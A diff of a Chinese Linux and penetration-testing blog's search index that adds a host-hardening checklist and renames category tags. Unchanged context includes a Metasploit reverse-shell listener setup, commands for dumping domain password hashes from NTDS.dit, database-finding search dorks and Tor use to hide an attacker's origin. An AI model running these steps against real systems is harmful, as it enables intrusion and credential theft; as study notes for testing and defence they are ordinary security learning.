@@ -1,21 +1,81 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>linux开机和关机记录查看</title>
+    <title>Linux主机安全配置规范</title>
+    <url>/2021/Linux%E5%9F%BA%E7%BA%BF.html</url>
+    <content><![CDATA[<h2 id="一、账号口令"><a href="#一、账号口令" class="headerlink" title="一、账号口令"></a>一、账号口令</h2><p><strong>1 配置口令最小长度</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MIN_LEN，参考值：8</span><br></pre></td></tr></table></figure>
+
+<p><strong>2 配置口令生存周期</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MAX_DAYS，参考值：90</span><br></pre></td></tr></table></figure>
+
+<p><strong>3 配置密码复杂度策略</strong></p>
+<p>  CentOS系统：修改/etc/pam.d/system-auth文件, 在ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 选3种，追加到password requisite pam_cracklib.so后面，添加到配置文件中。<a id="more"></a><br>例如：password requisite pam_cracklib.so ucredit=-1 lcredit=-1 dcredit=-1<br>注：ucredit：大写字母个数；lcredit：小写字母个数；dcredit：数字个数；ocredit：特殊字符个数</p>
+<p><strong>4 限定用户su到root</strong></p>
+<p>  编辑su文件(vi /etc/pam.d/su)，在开头添加下面两行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auth sufficient pam_rootok.so</span><br><span class="line">auth required pam_wheel.so group&#x3D;wheel</span><br></pre></td></tr></table></figure>
+
+<p>这表明只有wheel组的成员可以使用su命令成为root用户。</p>
+<h2 id="二、认证授权"><a href="#二、认证授权" class="headerlink" title="二、认证授权"></a>二、认证授权</h2><p><strong>1 设置文件与目录缺省权限</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在文件&#x2F;etc&#x2F;profile中设置umask 默认：022，可改为027</span><br></pre></td></tr></table></figure>
+
+<p><strong>2 设置命令行界面超时退出</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;profile,增加 export TMOUT&#x3D;300(单位：秒），重新登录时生效</span><br></pre></td></tr></table></figure>
+
+<p><strong>3 禁止root用户远程ssh登录</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件,配置PermitRootLogin no 重启sshd服务生效</span><br></pre></td></tr></table></figure>
+
+<p><strong>4 启用syslog日志审计</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;rsyslog.conf, 配置: authpriv.* &#x2F;var&#x2F;log&#x2F;secure 并手动创建该文件，重启rsyslog生效</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、协议安全"><a href="#三、协议安全" class="headerlink" title="三、协议安全"></a>三、协议安全</h2><p><strong>1 禁止FTP匿名用户登录</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;vsftpd.conf(或&#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf)文件，设置：anonymous_enable&#x3D;NO</span><br></pre></td></tr></table></figure>
+
+<p><strong>2 禁止root登录VSFTP</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;ftpusers(或&#x2F;etc&#x2F;vsftpd&#x2F;ftpusers)文件，添加root</span><br></pre></td></tr></table></figure>
+
+<p><strong>3 SSH配置非22端口，禁用telnet协议</strong></p>
+<h2 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h2><p><strong>1 删除.netrc 文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查找，find &#x2F; -maxdepth 3 -name .netrc 2&gt;&#x2F;dev&#x2F;null，重命名或者删除</span><br></pre></td></tr></table></figure>
+
+<p><strong>2 删除hosts.equiv文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -maxdepth 3 -name hosts.equiv 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<p><strong>3 删除.rhosts 文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -maxdepth 3 -name .rhosts 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<p><strong>4 关闭不必要的服务和端口</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chkconfig --list</span><br><span class="line">chkconfig [--level levels] 服务名 off</span><br></pre></td></tr></table></figure>
+<p><strong>5 删除系统banner信息，避免泄漏操作系统泄漏</strong></p>
+<p>删除或重命名”/etc”目录下的 issue.net 和 issue 文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv &#x2F;etc&#x2F;issue &#x2F;etc&#x2F;issue.bak</span><br><span class="line">mv &#x2F;etc&#x2F;issue.net &#x2F;etc&#x2F;issue.net.bak</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux开机和关机记录查看</title>
     <url>/2021/linux%E8%AE%B0%E5%BD%95%E6%9F%A5%E7%9C%8B.html</url>
     <content><![CDATA[<h3 id="查看最近一次开机时间"><a href="#查看最近一次开机时间" class="headerlink" title="查看最近一次开机时间"></a>查看最近一次开机时间</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; who -b</span><br><span class="line">或者</span><br><span class="line">&gt; last -1 reboot</span><br></pre></td></tr></table></figure>
 
-<h3 id="查看关机记录"><a href="#查看关机记录" class="headerlink" title="查看关机记录"></a>查看关机记录<a id="more"></a></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; last -x | grep shutdown <span class="comment">#以关机时间段显示</span></span><br></pre></td></tr></table></figure>
+<h3 id="查看关机记录"><a href="#查看关机记录" class="headerlink" title="查看关机记录"></a>查看关机记录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; last -x | grep shutdown <span class="comment">#以关机时间段显示</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="查看失败登录记录-来源以IP显示"><a href="#查看失败登录记录-来源以IP显示" class="headerlink" title="查看失败登录记录, 来源以IP显示"></a>查看失败登录记录, 来源以IP显示</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; sudo lastb -i</span><br></pre></td></tr></table></figure>
+<h3 id="查看失败登录记录-来源以IP显示"><a href="#查看失败登录记录-来源以IP显示" class="headerlink" title="查看失败登录记录, 来源以IP显示"></a><a id="more"></a>查看失败登录记录, 来源以IP显示</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; sudo lastb -i</span><br></pre></td></tr></table></figure>
 
 <h3 id="查看系统从上次开机到现在已经运行多久了"><a href="#查看系统从上次开机到现在已经运行多久了" class="headerlink" title="查看系统从上次开机到现在已经运行多久了"></a>查看系统从上次开机到现在已经运行多久了</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; uptime</span><br><span class="line">或者</span><br><span class="line">&gt; w</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>linux</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>linux</tag>
-        <tag>network</tag>
+        <tag>Linux</tag>
+        <tag>Network</tag>
       </tags>
   </entry>
   <entry>
@@ -64,10 +124,10 @@
 <p>这样不管通过http访问将跳转到https，正常访问</p>
 <img src="../images/upload/202104085.png" style="zoom:50%;" />]]></content>
       <categories>
-        <category>编程</category>
+        <category>Programming</category>
       </categories>
       <tags>
-        <tag>network</tag>
+        <tag>Network</tag>
         <tag>git</tag>
       </tags>
   </entry>
@@ -80,7 +140,7 @@
 <p>setWindowIcon是QApplication的方法，而不是QWidget的，所以使用app.setWindowIcon设置是对的<br>注意：<font color=red>在macOS下，图标是显示在程序坞中！！！</font>&gt;</p>
 ]]></content>
       <categories>
-        <category>编程</category>
+        <category>Programming</category>
       </categories>
       <tags>
         <tag>python</tag>
@@ -133,7 +193,7 @@
 
 ]]></content>
       <categories>
-        <category>编程</category>
+        <category>Programming</category>
       </categories>
   </entry>
   <entry>
@@ -158,7 +218,7 @@
 
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>Penetration</category>
       </categories>
   </entry>
   <entry>
@@ -176,13 +236,13 @@
 <p><code>filename1</code>：要压缩的文件名，可以多个，也可用通配符`file*</p>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>Penetration</category>
       </categories>
   </entry>
   <entry>
-    <title>Tor的使用与渗透测试</title>
+    <title>Tor的使用与Penetration</title>
     <url>/2020/tor%E4%BD%BF%E7%94%A8.html</url>
-    <content><![CDATA[<p>Tor主要用来访问匿名网络也就是已<code>.onion</code>结尾的域名，当然也可访问某些正常的网站如google、twitter等，但并不推荐如此做；今天要说的是在渗透测试中如何利用Tor网络对目标进行渗透，防止被溯源和审查等，隐藏攻击者身份和IP地址</p>
+    <content><![CDATA[<p>Tor主要用来访问匿名网络也就是已<code>.onion</code>结尾的域名，当然也可访问某些正常的网站如google、twitter等，但并不推荐如此做；今天要说的是在Penetration中如何利用Tor网络对目标进行渗透，防止被溯源和审查等，隐藏攻击者身份和IP地址</p>
 <p>官方解释：<font color=green>Tor是一个您能运行在您的电脑上，保护您在互联网上安全的程序。 它会将您的通信在一个由多个中继站组成的分散网络内不断传递，这些中继站被来自世界各地的志愿者们运营，并以此来保护您：这阻止了某些人通过您访问了哪些网址来得知您的网络链接，也防止了您访问的网站获取您的地理位置。 这些由志愿者搭建的中继被成为 Tor 网络。</font><a id="more"></a></p>
 <h3 id="0x01-访问Tor的方式"><a href="#0x01-访问Tor的方式" class="headerlink" title="0x01 访问Tor的方式"></a>0x01 访问Tor的方式</h3><hr>
 <p>1、直接使用Tor Browser浏览器，内置Tor Project加上Firefox浏览器–<code>推荐</code></p>
@@ -256,7 +316,7 @@
 <p>1、<strong>请勿将您的手机在 Tor 上用于两步验证</strong><br>2、<strong>不要在 TOR 之外操作用户帐户</strong><br>3、<strong>不要发布有关您的任何个人信息</strong><br>4、<strong>不要通过 TOR 发送未加密的数据</strong><br>5、<strong>不要忘记删除 cookies 和本地网站数据</strong><br>6、<strong>请勿将 TOR 用于 Google 搜索</strong><br>7、<strong>不要在 TOR 上打开 HTTP 网站</strong><br>8、<strong>不要同时使用 Tor 和不使用 Tor 访问同一台服务器</strong></p>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>Penetration</category>
       </categories>
   </entry>
   <entry>
@@ -279,7 +339,7 @@
 <p><a href="https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement" target="_blank" rel="noopener">https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement</a><br><a href="https://work.weixin.qq.com/api/doc" target="_blank" rel="noopener">https://work.weixin.qq.com/api/doc</a></p>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>Penetration</category>
       </categories>
   </entry>
   <entry>
@@ -330,7 +390,7 @@
 <h3 id="Msfvenom连接一句话："><a href="#Msfvenom连接一句话：" class="headerlink" title="Msfvenom连接一句话："></a>Msfvenom连接一句话：</h3><p>msf支持多种反弹方式，比如exe ps php asp aspx甚至是ruby等，我们可以用msfvenom来生成payload，然后在msf中监听，执行之后就会反弹回来session。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 172.16.1.130</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>Penetration</category>
       </categories>
   </entry>
   <entry>
@@ -346,7 +406,7 @@
 <img src="../images/upload/cookie.png" style="zoom: 67%;" />]]></content>
   </entry>
   <entry>
-    <title>linux 查看硬件架构|系统版本|内核版本</title>
+    <title>Linux 查看硬件架构|系统版本|内核版本</title>
     <url>/2020/linux%E7%89%88%E6%9C%AC.html</url>
     <content><![CDATA[<p><font color=green>有时候,我们可能需要获取Linux系统的一些关键信息,以下列举了部分常用的命令做为备忘📝</font></p>
 <h3 id="一、查看系统架构"><a href="#一、查看系统架构" class="headerlink" title="一、查看系统架构"></a>一、查看系统架构</h3><ul>
@@ -394,7 +454,7 @@
 </ul>
 ]]></content>
       <categories>
-        <category>linux</category>
+        <category>Linux</category>
       </categories>
   </entry>
   <entry>
@@ -631,7 +691,7 @@
 <p>接下来我们就可以开始解密了，首先通过注册表的方式获取<code>KEY</code>，再用<code>NTDSDumpEx</code>获取所有域用户hash：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\windows\temp\sys.hiv</span><br><span class="line">NTDSDdumpEx.exe -d ntds.dit -o hash.txt -s sys.hiv -h</span><br></pre></td></tr></table></figure>]]></content>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>Penetration</tag>
       </tags>
   </entry>
   <entry>
@@ -765,11 +825,11 @@
 
 ]]></content>
       <categories>
-        <category>network</category>
+        <category>Network</category>
       </categories>
       <tags>
-        <tag>linux</tag>
-        <tag>network</tag>
+        <tag>Linux</tag>
+        <tag>Network</tag>
       </tags>
   </entry>
   <entry>
@@ -781,10 +841,10 @@
 <h4 id="2、获取ROOT权限"><a href="#2、获取ROOT权限" class="headerlink" title="2、获取ROOT权限"></a><strong>2、获取ROOT权限</strong></h4><p>1）开启手机开发者模式，打开usb调试选项；打开oem解锁；将手机设置为滑动解锁，通过usb数据线连接电脑<br>2）Windows下载安装mininal adb and fastboot软件<br><img width=30% height=10% src="/images/upload/img_000.png"><img width=50% height=10% src="/images/upload/img_001.png">3）下载第三方Recovery mode；将其放入mininal adb安装目录下，以方便操作<br><img width=30% height=10% src="/images/upload/img_002.png">4）下载Magisk Manager压缩包，拷入手机根目录（使用脸谱获得root权限）<br><img width=30% height=10% src="/images/upload/img_003.png">5）命令行进入adb安装目录；执行如下命令进入recovery mode<br><img width=50% height=10% src="/images/upload/img_004.png">然后点击高级—进入刷机模式<br><img width=50% height=10% src="/images/upload/img_005.png"><img width=50% height=10% src="/images/upload/img_006.jpg">6）然后解锁OEM<br><img width=50% height=10% src="/images/upload/img_007.png">片刻后出现界面，选择unlock the bootloader<img width=50% height=10% src="/images/upload/img_008.jpg"></p>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>Penetration</category>
       </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>Penetration</tag>
       </tags>
   </entry>
   <entry>
@@ -1034,11 +1094,11 @@
 </pre></td><td class="code"><pre><span class="line">$ iptables -A loging -j DROP</span>
 </pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>linux</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>linux</tag>
-        <tag>network</tag>
+        <tag>Linux</tag>
+        <tag>Network</tag>
       </tags>
   </entry>
   <entry>
@@ -1061,7 +1121,7 @@
 <span class="line">    ],</span>
 </pre></td></tr></table></figure>]]></content>
       <tags>
-        <tag>编程</tag>
+        <tag>Programming</tag>
         <tag>计算机</tag>
       </tags>
   </entry>
@@ -1082,15 +1142,15 @@
 <h3 id="8、真实的数据库文件"><a href="#8、真实的数据库文件" class="headerlink" title="8、真实的数据库文件"></a><a href="#8、真实的数据库文件" title="8、真实的数据库文件"></a>8、真实的数据库文件</h3><p>攻击者还能直接搜索到数据库本身，并不适合所有的数据库系统，只适合哪些有着特定名字或者扩展名的数据库,因为是二进制文件，所以没法在里面搜索字符<br>实例：<br>filetype:mdb inurl:com</p>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>Penetration</category>
       </categories>
       <tags>
-        <tag>渗透测试</tag>
-        <tag>linux</tag>
+        <tag>Linux</tag>
+        <tag>Penetration</tag>
       </tags>
   </entry>
   <entry>
-    <title>密码学笔记</title>
+    <title>Cryptography笔记</title>
     <url>/2018/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0.html</url>
     <content><![CDATA[<p>1.<br>加密方法可以分为两大类。一类是单钥加密（private key cryptography），还有一类叫做双钥加密（public key cryptography）。前者的加密和解密过程都用同一套密码，后者的加密和解密过程用的是两套密码。历史上，人类传统的加密方法都是前一种，比如二战期间德军用的Enigma电报密码。<a id="more"></a>莫尔斯电码也可以看作是一种私钥加密方法。</p>
 <p>2.<br>在单钥加密的情况下，密钥只有一把，所以密钥的保存变得很重要。一旦密钥泄漏，密码也就被破解。</p>
@@ -1102,10 +1162,10 @@
 <p>4.<br>目前，通用的单钥加密算法为DES（Data Encryption Standard），通用的双钥加密算法为RSA（ Rivest-Shamir-Adleman），都产生于上个世纪70年代。<br>5.<br>在双钥体系中，公钥用来加密信息，私钥用来数字签名。<br>6.<br>因为任何人都可以生成自己的（公钥，私钥）对，所以为了防止有人散布伪造的公钥骗取信任，就需要一个可靠的第三方机构来生成经过认证的（公钥，私钥）对。目前，世界上最主要的数字服务认证商是位于美国加州的Verisign公司，它的主要业务就是分发RSA数字证书。</p>
 ]]></content>
       <categories>
-        <category>密码学</category>
+        <category>Cryptography</category>
       </categories>
       <tags>
-        <tag>密码学</tag>
+        <tag>Cryptography</tag>
       </tags>
   </entry>
   <entry>
@@ -1173,7 +1233,7 @@
 </pre></td></tr></table></figure>
 
 <p>这样就创建了一个socks代理服务，如果你有一台国外的vps，这就可以实现翻墙了而且不用担心GFW检测而封了ip。</p>
-<h3 id="X协议转发："><a href="#X协议转发：" class="headerlink" title="X协议转发："></a><a href="#X协议转发：" title="X协议转发："></a>X协议转发：</h3><p>X窗口和VNC相似都可以给linux提供桌面窗口服务，现在我们要把Xclient端的X窗口显示在Xserver端。<br>先需要Xclient(也就是远程linux主机)上指定Xserver的位置，命令如下：</p>
+<h3 id="X协议转发："><a href="#X协议转发：" class="headerlink" title="X协议转发："></a><a href="#X协议转发：" title="X协议转发："></a>X协议转发：</h3><p>X窗口和VNC相似都可以给Linux提供桌面窗口服务，现在我们要把Xclient端的X窗口显示在Xserver端。<br>先需要Xclient(也就是远程Linux主机)上指定Xserver的位置，命令如下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
 </pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> DISPLAY=&lt;X Server IP&gt;:&lt;display <span class="comment">#&gt;.&lt;virtual #&gt;</span></span>
 </pre></td></tr></table></figure>
@@ -1191,7 +1251,8 @@
 <h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><a href="#Summary" title="Summary"></a>Summary</h2><p>总的来说，对于一些已知端口的应用如Telnet/Smtp等，我们可以使用本地转发或远程转发。而动态转发则实现了socks代理从而起到加密数据传输和突破防火墙的功能。</p>
 ]]></content>
       <categories>
-        <category>网络代理</category>
+        <category>Linux</category>
+        <category>Network proxy</category>
       </categories>
       <tags>
         <tag>端口转发</tag>
